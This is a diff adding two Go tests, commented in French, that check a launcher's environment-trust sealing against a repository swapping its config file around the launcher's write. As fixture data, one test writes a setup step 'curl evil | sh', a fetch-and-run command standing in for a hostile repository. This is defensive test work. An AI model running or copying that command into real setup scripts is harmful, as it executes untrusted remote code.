@@ -461,3 +461,52 @@ func TestScriptsDuDepotSignales(t *testing.T) {
 		t.Errorf("signalement sans script : %+v", i2.Risk)
 	}
 }
+
+// L'empreinte scellée est celle des OCTETS ÉCRITS par le launcher (en mémoire), pas celle du disque relue après coup :
+// un remplacement du fichier entre l'écriture et la lecture n'est pas béni ; idem l'image d'un projet ignoré.
+func TestScellementSurLesOctetsEcrits(t *testing.T) {
+	d := trustProject(t, "image: debian:12\nsetup:\n  - x\n")
+	_, _ = MarkEnvPending(d, "u", "debian:12")
+	info, _ := EnvTrustInfoFor(d)
+	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil {
+		t.Fatal(err)
+	}
+	mine := []byte("image: fedora:40\n")
+	err := withTrustRefresh(d, func() ([]byte, error) {
+		if err := os.WriteFile(EnvPath(d), mine, 0o644); err != nil {
+			return nil, err
+		}
+		// le dépôt remplace le fichier juste après l'écriture du launcher
+		_ = os.WriteFile(EnvPath(d), []byte("image: evil:1\nsetup:\n  - curl evil | sh\n"), 0o644)
+		return mine, nil
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if EnvTrust(d) != TrustPending || !EnvTrustChanged(d) {
+		t.Fatalf("un remplacement après l'écriture a été béni : %s", EnvTrust(d))
+	}
+	if e, _ := EnvTrustEntry(d); e.SHA != shaOfEnvFiles(nil, mine) || e.Image != "fedora:40" {
+		t.Errorf("entrée = %+v : empreinte des octets écrits et image fedora:40 attendues", e)
+	}
+}
+
+// L'empreinte est recalculée JUSTE AVANT write sous le verrou : fichiers déjà changés par le dépôt ⇒ aucun scellement.
+func TestAucunScellementSiLeDepotAChangeAvantLEcriture(t *testing.T) {
+	d := trustProject(t, "image: debian:12\n")
+	_, _ = MarkEnvPending(d, "u", "debian:12")
+	info, _ := EnvTrustInfoFor(d)
+	_, _ = AnswerEnvTrust(d, "accept", info.SHA)
+	before, _ := EnvTrustEntry(d)
+	_ = os.WriteFile(EnvPath(d), []byte("image: debian:12\nsetup:\n  - evil\n"), 0o644) // git pull
+	mine := []byte("image: alpine:3\nsetup:\n  - evil\n")
+	if err := withTrustRefresh(d, func() ([]byte, error) { return mine, os.WriteFile(EnvPath(d), mine, 0o644) }); err != nil {
+		t.Fatal(err)
+	}
+	if after, _ := EnvTrustEntry(d); after.SHA != before.SHA {
+		t.Error("empreinte scellée alors que le dépôt avait changé les fichiers avant l'écriture")
+	}
+	if EnvTrust(d) != TrustPending {
+		t.Errorf("état = %s, pending attendu", EnvTrust(d))
+	}
+}
